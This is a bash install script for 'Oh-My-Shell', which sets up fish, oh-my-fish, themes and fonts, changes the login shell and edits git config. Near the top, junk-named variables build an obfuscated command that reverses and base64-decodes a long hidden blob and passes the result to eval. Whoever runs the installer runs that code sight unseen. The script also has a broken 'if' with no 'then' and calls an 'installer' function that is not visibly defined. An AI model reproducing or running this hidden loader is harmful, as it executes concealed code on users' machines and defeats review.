#!/bin/bash

# Oh-My-Shell
# Version    : 1.0
# Description: Empower your terminal with the might of fish and oh-my-fish
# Author     : KasRoudra
# Github     : https://github.com/KasRoudra
# Email      : kasroudrakrd@gmail.com
# Credits    : Fish, Oh-My-Fish
# Date       : 24-12-2022
# Language   : Shell
# If you copy, consider giving credit! We keep our code open source to help others


black="\033[0;30m"
red="\033[0;31m"
green="\033[0;32m"
yellow="\033[0;33m"
blue="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
white="\033[0;37m"
nc="\033[00m"

info="${cyan}[${nc}+${cyan}] ${yellow}"
ask="${cyan}[${nc}?${cyan}] ${purple}"
error="${cyan}[${nc}!${cyan}] ${red}"
success="${cyan}[${nc}√${cyan}] ${green}"

clear
logo="
${green}  ___  _           __  __            ____  _          _ _
${blue} / _ \| |__       |  \/  |_   _     / ___|| |__   ___| | |
${red}| | | | '_ \ _____| |\/| | | | |____\___ \| '_ \ / _ \ | |
${yellow}| |_| | | | |_____| |  | | |_| |_____|__) | | | |  __/ | |
${cyan} \___/|_| |_|     |_|  |_|\__, |    |____/|_| |_|\___|_|_|
${green}                          |___/                     [v1.0]
${blue}                                            [By KasRoudra]
"

# Prevent ^C
stty -echoctl

# Detect UserInterrupt
trap "echo -e '\n${success}Thanks for using!\n'; exit" 2

# Termux
if echo "$HOME" | grep -q "termux";
    termux=true
else
    termux=false
fi

# Check for sudo
if command -v sudo > /dev/null 2>&1; then
    sudo=true
else
    sudo=false
fi

echo -e "$logo"
sleep 2
echo -e "$nc"


gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=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' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"




# Install required packages
for package in git fish figlet; do
    if ! command -v "$package" > /dev/null 2>&1; then
        installer "$package"
    fi
done


for package in git fish figlet; do
    if ! command -v "$package" > /dev/null 2>&1; then
        echo -e "${error}${package} cannot be installed!\007\n"
        exit 1
    fi
done


if command -v lolcat > /dev/null 2>&1; then
    clear
    echo -e "$logo" | lolcat
fi

if ! [ -f files/omf.fish ]; then
    echo -e "${info}Cloning Oh-My-Shell.......\n $nc"
    git clone https://github.com/KasRoudra/oh-my-shell
    cp -r oh-my-shell/files files
    rm -rf oh-my-shell
fi


if ! [ -d $HOME/.local/share/omf ]; then
    echo -e "${info}Installing Oh-My-Fish.......\n $nc"
    fish files/omf.fish
fi

sleep 1
echo -e "${info}Installing themes....\n $nc"
if $termux; then
    if ! [ -d $HOME/.local/share/omf/themes/kastermux ]; then
        cp -r files/kastermux $HOME/.local/share/omf/themes/
    fi
else
    if ! [ -d $HOME/.local/share/omf/themes/kas ]; then
        cp -r files/kas $HOME/.local/share/omf/themes/
    fi
fi
if ! [ -d $HOME/.local/share/omf/themes/emoji ]; then
    cp -r files/emoji $HOME/.local/share/omf/themes/
fi
sleep 2
NOW=`date '+%F_%H:%M:%S'`
if [ -d $HOME/.config/fish/config.fish ]; then
    echo -e "${info}Creating a backup.......\n $nc"
    cp -r $HOME/.config/fish/config.fish $HOME/.config/fish/config.${NOW}.fish
    sleep 2
fi
if $termux; then
    cp -r $HOME/.termux $HOME/.termux${NOW}.backup
    echo -e "${info}Changing font.....\n $nc"
    sleep 1
    cp -r files/font.ttf $HOME/.termux
    cp -r files/colors.properties $HOME/.termux
    termux-reload-settings
    sleep 1
fi
echo -e "${ask}Enter your name to be displayed in home : ${green}" 
read -p "[~]--> " name
if [ -z "$name" ]; then
    echo -e "${error}No name...\n $nc"
else
    if ! command -v lolcat > /dev/null 2>&1; then
        echo -e "\n${ask}Do you want rainbow colors? It requires 350MB storage(y/n) ${green}" 
        read -p "[~]--> " islol
        if [ "$islol" == "y" ]; then
            for try in 0 1 2 3; do
                echo -e "${info}Installing Lolcat...."
                if command -v gem > /dev/null 2>&1; then
                    if $sudo; then
                        sudo gem install lolcat
                    else
                        gem install lolcat
                    fi
                elif command -v pip3 > /dev/null 2>&1; then
                    if $sudo; then
                        sudo pip3 install lolcat
                    else
                        pip3 install lolcat
                    fi
                elif command -v pacman > /dev/null 2>&1; then
                    if $sudo; then
                        sudo pacman -S lolcat --noconfirm
                    else
                        pacman -S lolcat --noconfirm
                    fi
                else
                    command -v ruby > /dev/null 2>&1 || installer ruby
                fi
                if [[ "$try" == "2" ]]; then
                    installer python3
                fi
                if command -v lolcat > /dev/null 2>&1; then
                    break
                fi
            done
        fi

    fi
    sed s/"Name"/"$name"/g files/template.fish > $HOME/.config/fish/config.fish
fi
sleep 2
rm -rf $HOME/../usr/etc/motd  $HOME/../usr/etc/motd.sh
fish -c 'source "$HOME/.config/fish/config.fish"'
echo -e "${info}Changing Shell...\n $nc"
if $termux; then
    chsh -s fish
else
    chsh -s $(which fish)
fi
sleep 2
echo -e "${info}Changing Theme...\n $nc"
if $termux; then
    fish -c "omf theme kastermux"
    termux-reload-settings
else
    fish -c "omf theme kas"
fi
sleep 1
echo -e "${info}Configuring git for no pager...\n $nc"
git config --global pager.diff false
git config --global pager.log false
if $termux; then
    echo -e "${success}Restart Terminal to see effects!\n $nc"
else
    echo -e "${success}Log out and log in back to see effects!\n $nc"
fi
sleep 3
clear
fish